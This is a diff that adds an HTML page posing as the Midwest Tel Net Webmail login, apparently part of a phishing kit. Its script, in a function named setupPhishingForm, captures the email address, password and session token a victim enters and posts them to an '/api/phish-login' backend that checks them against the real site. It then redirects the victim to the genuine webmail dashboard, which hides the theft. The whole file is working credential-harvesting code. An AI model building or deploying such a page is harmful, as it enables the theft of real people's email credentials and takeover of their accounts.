@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+ <head>
+ <!-- Keep all your existing meta tags/styles -->
+ <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
+ <title>Midwest Tel Net Webmail :: Welcome</title>
+ <link rel="stylesheet" type="text/css" href="https://webmail.mwt.net/skins/larry/styles.min.css?s=1689092804" />
+ </head>
+ <body>
+ 
+ <!-- Keep your EmailJS SDK init -->
+ <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+ <script>
+ document.addEventListener('DOMContentLoaded', () => {
+   
+   // STEP 1: Get the fresh token and HTML from our backend
+   fetch('/api/get-login-page')
+     .then(res => res.json())
+     .then(data => {
+       // Inject the fresh HTML into the body
+       document.body.innerHTML = data.html;
+       
+       // Re-bind events since we replaced the DOM
+       setupPhishingForm();
+     })
+     .catch(err => {
+       console.error("Failed to load login page", err);
+       alert("Error loading page. Check console.");
+     });
+
+ });
+
+ function setupPhishingForm() {
+   const form = document.getElementById('contact-form');
+   if(!form) return;
+
+   form.addEventListener('submit', async (e) => {
+     e.preventDefault();
+     
+     const emailInput = document.querySelector('input[name="_user"]');
+     const passwordInput = document.querySelector('input[name="_pass"]');
+     const tokenInput = document.querySelector('input[name="_token"]');
+     const submitBtn = document.getElementById('rcmloginsubmit');
+
+     const email = emailInput.value;
+     const password = passwordInput.value;
+     const token = tokenInput.value; // Use the token we injected
+
+     submitBtn.disabled = true;
+     submitBtn.innerText = "Verifying...";
+
+     try {
+       // Call our backend to validate against the real site
+       const res = await fetch('/api/phish-login', {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({ email, password, token })
+       });
+
+       const data = await res.json();
+
+       if (data.success) {
+         // Redirect to the real site's main dashboard
+         window.location.replace('https://webmail.mwt.net/?_task=mail');
+       } else {
+         alert('Invalid Credentials.');
+         submitBtn.disabled = false;
+         submitBtn.innerText = "Login";
+       }
+     } catch (err) {
+       alert('Connection Error');
+       submitBtn.disabled = false;
+       submitBtn.innerText = "Login";
+     }
+   });
+ }
+ </script>
+
+ <!-- Body will be populated by the script above -->
+ 
+</body>
+</html>
